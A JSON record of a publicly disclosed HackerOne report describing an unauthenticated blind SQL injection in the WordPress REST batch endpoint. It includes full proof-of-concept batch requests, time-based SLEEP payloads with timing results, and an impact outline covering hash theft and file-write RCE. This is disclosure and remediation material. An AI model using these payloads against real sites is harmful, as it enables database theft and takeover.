@@ -1,0 +1,132 @@
+{
+  "id": 3873072,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODczMDcy",
+  "url": "https://hackerone.com/reports/3873072",
+  "title": "Unauthenticated SQL Injection via REST Batch Route Confusion ████████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-18T16:55:47.849Z",
+  "submitted_at": "2026-07-18T16:55:49.237Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "matty69v",
+    "url": "/matty69v",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/d9drin7bro3d44gr64nbpghu6pik/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 109248,
+    "url": "https://hackerone.com/essity",
+    "handle": "essity",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Essity",
+      "twitter_handle": "",
+      "website": "http://essity.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-07-21T13:51:41.136Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-07-20T12:44:21.607Z",
+  "team_member_agreed_on_going_public_at": "2026-07-21T13:51:40.766Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nThe WordPress REST API batch endpoint (`/wp-json/batch/v1`) on `████████` is vulnerable to an **unauthenticated blind SQL injection**. By nesting a crafted batch payload, an attacker triggers a route-dispatch desynchronisation that causes a user-controlled string to bypass parameter sanitisation and reach a raw SQL `NOT IN (...)` clause. No authentication, cookies, or tokens are required.\n\n## Root Cause\n\nTwo flaws chain together:\n\n1. **Batch dispatch index desync**  When a sub-request path fails `parse_url()`, the error result is not pushed into the internal `$matches` array, but the dispatch loop still increments its index. This causes sub-request *N* to execute with the handler registered for sub-request *N+1*.\n\n2. **Missing type guard on `author__not_in`**  `WP_Query` checks `if (! empty($q['author__not_in']))` but does not verify it is an array. When a string value arrives (via the desynchronised route), it skips the per-element `absint()` cast and is concatenated directly into the SQL query:\n   ```sql\n   AND wp_posts.post_author NOT IN ( <attacker-controlled> )\n   ```\n\nBy embedding a second batch layer inside a `POST /wp/v2/categories` body, the inner sub-requests are re-dispatched with shifted handlers, allowing a `GET /wp/v2/categories?author_exclude=<SQLI>` to execute as a posts query with raw injection.\n\n## Proof of Concept\n\n### Step 1 —Version fingerprint\n\n```\nGET /feed/ HTTP/1.1\nHost: ████████\n```\n\nResponse contains:\n```xml\n<generator>https://wordpress.org/?v=7.0</generator>\n```\n\nWordPress **7.0**  affected version.\n\n### Step 2  Structural confirmation (non-destructive)\n\n```http\nPOST /wp-json/batch/v1 HTTP/1.1\nHost: ████████\nContent-Type: application/json\n\n{\"validation\":\"normal\",\"requests\":[\n  {\"path\":\":\",\"method\":\"POST\"},\n  {\"path\":\"/wp/v2/categories\",\"method\":\"POST\",\"body\":{\n    \"name\":\"x\",\"requests\":[\n      {\"path\":\":\",\"method\":\"GET\"},\n      {\"path\":\"/wp/v2/categories?author_exclude=1\",\"method\":\"GET\"},\n      {\"path\":\"/wp/v2/posts\",\"method\":\"GET\"}\n    ]}},\n  {\"path\":\"/batch/v1\",\"method\":\"POST\"}\n]}\n```\n\n**Response (HTTP 207):**\n\n```\n[0] status=400  code=parse_path_failed         ← invalid path \":\" triggers desync\n[1] status=207  → NESTED BATCH ENVELOPE        ← route confusion confirmed\n    [0] status=400  code=parse_path_failed\n    [1] status=200  → 10 posts returned         ← author__not_in=1 reached the DB\n    [2] status=500  code=rest_invalid_handler\n[2] status=400  code=rest_batch_not_allowed\n```\n\nThe **nested** `\"responses\"` array (batch-inside-batch) with `parse_path_failed` markers proves the dispatch desynchronisation executed. A patched server returns a flat envelope with `rest_cannot_create`.\n\n### Step 3  Time-based SQL injection confirmation\n\nInjection point: `author_exclude=1) OR SLEEP(N)-- -`\n\nSame request as Step 2, replacing `author_exclude=1` with the payloads below:\n\n| Payload | Response Time | HTTP | Notes |\n|---|---|---|---|\n| `1` (baseline) | **0.46 s** | 207 | No SQL function |\n| `1) OR SLEEP(0)-- -` | **0.49 s** | 207 | SQL parsed, zero delay |\n| `1) OR SLEEP(0)-- -` (repeat) | **0.54 s** | 207 | Consistent baseline |\n| `1) OR SLEEP(0.01)-- -` | **9.12 s** | 207 | ~860 rows × 0.01s |\n| `1) OR SLEEP(0.3)-- -` | **>30 s** | timeout | ~860 rows × 0.3s |\n| `1) OR SLEEP(3)-- -` | **>60 s** | timeout | ~860 rows × 3s |\n\nThe differential between `SLEEP(0)` (**0.5s**) and `SLEEP(0.01)` (**9.1s**)  identical SQL structure, only the delay constant differs  proves the injected function executes on the MySQL backend. The per-row multiplication (~860 matching posts) confirms injection inside a `WP_Query` result-set evaluation.\n\n## Testing Discipline\n\nAll testing was non-destructive: structural detection with a benign value (`1`), timing oracle (`SLEEP`), and version fingerprinting from public metadata. **No database content was extracted. No user data or PII was accessed.**\n\n## Impact\n\nAn unauthenticated attacker can read any data accessible to the WordPress database account:\n\n- **`wp_users`**  password hashes → offline cracking → admin account takeover\n- **`wp_usermeta`**  session tokens, application passwords → direct session hijack\n- **`wp_options`**  API keys, plugin secrets, site configuration\n- On deployments where the MySQL account holds `FILE` privilege with webroot access, this escalates to **remote code execution** via `SELECT ... INTO OUTFILE`\n\n## Remediation\n\n1. **Update WordPress** to the latest patched release (7.0.2+ / 6.9.5+ / 6.8.6+).\n2. Interim: block unauthenticated `POST` to `/wp-json/batch/v1` and `/?rest_route=/batch/v1` at the reverse proxy or WAF.\n3. Audit and restrict the MySQL account's privileges  revoke `FILE` if granted.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 6,
+  "voters": [
+    "frijolsec",
+    "coder_mohammed",
+    "0xsheet",
+    "2026",
+    "matty69v",
+    "en3cm42ns"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "User",
+    "cvss_4_point_0_metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "attack_requirements": "none",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "vulnerable_confidentiality": "high",
+      "vulnerable_integrity": "high",
+      "vulnerable_availability": "high",
+      "subsequent_confidentiality": "none",
+      "subsequent_integrity": "none",
+      "subsequent_availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 992077,
+    "asset_type": "URL",
+    "asset_identifier": "https://dedicatoame.it/",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
